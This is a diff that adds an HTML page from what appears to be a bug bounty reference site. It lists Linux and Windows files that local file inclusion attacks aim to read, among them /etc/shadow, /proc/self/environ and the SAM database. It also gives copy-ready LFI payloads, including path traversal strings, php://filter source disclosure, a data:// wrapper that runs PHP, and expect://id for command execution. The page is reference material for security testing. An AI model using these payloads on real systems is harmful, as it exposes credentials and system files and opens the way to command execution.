@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LFI Payloads - Bug Bounty Hub</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="index.html" class="nav-logo">
+                <img src="logo/logo.png" alt="BugBounty Hub">
+            </a>
+            <button class="nav-toggle" id="navToggle">
+                <i class="fas fa-bars"></i>
+            </button>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="index.html" class="nav-link">Home</a></li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link">Vulnerabilities <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="manual-open-redirect.html"><i class="fas fa-external-link-alt"></i> Manual Open Redirect</a></li>
+                        <li><a href="open-redirect.html"><i class="fas fa-robot"></i> Automated Open Redirect</a></li>
+                        <li><a href="xss.html"><i class="fas fa-bug"></i> XSS</a></li>
+                        <li><a href="blind-xss.html"><i class="fas fa-eye-slash"></i> Blind XSS</a></li>
+                        <li><a href="sqli.html"><i class="fas fa-database"></i> SQL Injection</a></li>
+                        <li><a href="idor.html"><i class="fas fa-id-card"></i> IDOR</a></li>
+                        <li><a href="lfi.html"><i class="fas fa-folder-open"></i> LFI</a></li>
+                        <li><a href="cmdi.html"><i class="fas fa-terminal"></i> Command Injection</a></li>
+                        <li><a href="subdomain-takeover.html"><i class="fas fa-globe"></i> Subdomain Takeover</a></li>
+                        <li><a href="cors.html"><i class="fas fa-exchange-alt"></i> CORS</a></li>
+                        <li><a href="csp-guide.html"><i class="fas fa-shield-alt"></i> CSP Guide</a></li>
+                        <li><a href="xxe.html"><i class="fas fa-file-code"></i> XXE</a></li>
+                        <li><a href="ssti.html"><i class="fas fa-file-alt"></i> SSTI</a></li>
+                        <li><a href="crlf.html"><i class="fas fa-code"></i> CRLF Injection</a></li>
+                        <li><a href="ssrf-payloads.html"><i class="fas fa-server"></i> SSRF Payloads</a></li>
+                        <li><a href="race-conditions.html"><i class="fas fa-stopwatch"></i> Race Conditions</a></li>
+                        <li><a href="poisoning.html"><i class="fas fa-bolt"></i> Cache Poisoning</a></li>
+                        <li><a href="information-disclosure.html"><i class="fas fa-eye"></i> Info Disclosure</a></li>
+                        <li><a href="host-header-injection.html"><i class="fas fa-globe-americas"></i> Host Header</a></li>
+                        <li><a href="header-injection.html"><i class="fas fa-heading"></i> Header Injection</a></li>
+                        <li><a href="html-injection.html"><i class="fas fa-code"></i> HTML Injection</a></li>
+                        <li><a href="directory-traversal.html"><i class="fas fa-folder"></i> Directory Traversal</a></li>
+                        <li><a href="wordpress.html"><i class="fab fa-wordpress"></i> WordPress</a></li>
+                        <li><a href="spring-boot.html"><i class="fas fa-leaf"></i> Spring Boot</a></li>
+                    </ul>
+                </li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link">Tools <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="useful-tools.html"><i class="fas fa-toolbox"></i> Recon Tools</a></li>
+                        <li><a href="nuclei.html"><i class="fas fa-rocket"></i> Nuclei</a></li>
+                    </ul>
+                </li>
+                <li><a href="payloads.html" class="nav-link">Payloads</a></li>
+                <li><a href="payloads-lfi.html" class="nav-link active">LFI</a></li>
+                <li><a href="about.html" class="nav-link">About</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <header class="page-header">
+        <div class="breadcrumb">
+            <a href="index.html">Home</a>
+            <i class="fas fa-chevron-right"></i>
+            <a href="payloads.html">Payloads</a>
+            <i class="fas fa-chevron-right"></i>
+            <span>LFI</span>
+        </div>
+        <h1><i class="fas fa-folder-open"></i> LFI Payloads</h1>
+        <p>Local File Inclusion payload collection for testing.</p>
+    </header>
+
+    <section class="content-section">
+        <div class="container">
+            <div class="content-card">
+                <h2><i class="fas fa-folder-open"></i> Folder Contents</h2>
+                <p>This folder contains Local File Inclusion payloads for testing file access vulnerabilities.</p>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-file"></i> Linux File Targets</h2>
+                <table>
+                    <tr>
+                        <th>File</th>
+                        <th>Description</th>
+                    </tr>
+                    <tr>
+                        <td><code>/etc/passwd</code></td>
+                        <td>User account information</td>
+                    </tr>
+                    <tr>
+                        <td><code>/etc/shadow</code></td>
+                        <td>Password hashes (requires root)</td>
+                    </tr>
+                    <tr>
+                        <td><code>/etc/hosts</code></td>
+                        <td>Network host entries</td>
+                    </tr>
+                    <tr>
+                        <td><code>/etc/hostname</code></td>
+                        <td>System hostname</td>
+                    </tr>
+                    <tr>
+                        <td><code>/proc/self/environ</code></td>
+                        <td>Environment variables</td>
+                    </tr>
+                    <tr>
+                        <td><code>/proc/self/cmdline</code></td>
+                        <td>Process command line</td>
+                    </tr>
+                    <tr>
+                        <td><code>/proc/self/status</code></td>
+                        <td>Process status info</td>
+                    </tr>
+                    <tr>
+                        <td><code>/var/log/apache2/access.log</code></td>
+                        <td>Apache access logs</td>
+                    </tr>
+                    <tr>
+                        <td><code>/var/log/apache2/error.log</code></td>
+                        <td>Apache error logs</td>
+                    </tr>
+                    <tr>
+                        <td><code>/var/www/html/index.php</code></td>
+                        <td>Web root files</td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fab fa-windows"></i> Windows File Targets</h2>
+                <table>
+                    <tr>
+                        <th>File</th>
+                        <th>Description</th>
+                    </tr>
+                    <tr>
+                        <td><code>C:\Windows\win.ini</code></td>
+                        <td>Windows configuration</td>
+                    </tr>
+                    <tr>
+                        <td><code>C:\Windows\System32\drivers\etc\hosts</code></td>
+                        <td>Hosts file</td>
+                    </tr>
+                    <tr>
+                        <td><code>C:\inetpub\wwwroot\web.config</code></td>
+                        <td>IIS configuration</td>
+                    </tr>
+                    <tr>
+                        <td><code>C:\Windows\System32\config\SAM</code></td>
+                        <td>Password database</td>
+                    </tr>
+                </table>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-bolt"></i> LFI Payload Patterns</h2>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>../../../etc/passwd
+....//....//etc/passwd
+..\..\..\windows\win.ini
+php://filter/read=convert.base64-encode/resource=index.php
+php://input
+data://text/plain,<?php phpinfo(); ?>
+expect://id</pre>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-link"></i> Related Pages</h2>
+                <a href="lfi.html" class="btn btn-primary">LFI Testing Guide</a>
+                <a href="directory-traversal.html" class="btn btn-secondary" style="margin-left: 0.5rem;">Directory Traversal</a>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2026 Bug Bounty Hub. Open source security reference.</p>
+            <p>Made with <i class="fas fa-heart"></i> for the security community</p>
+        </div>
+    </footer>
+
+    <div id="toast" class="toast">Copied to clipboard!</div>
+    <script src="script.js"></script>
+</body>
+</html>
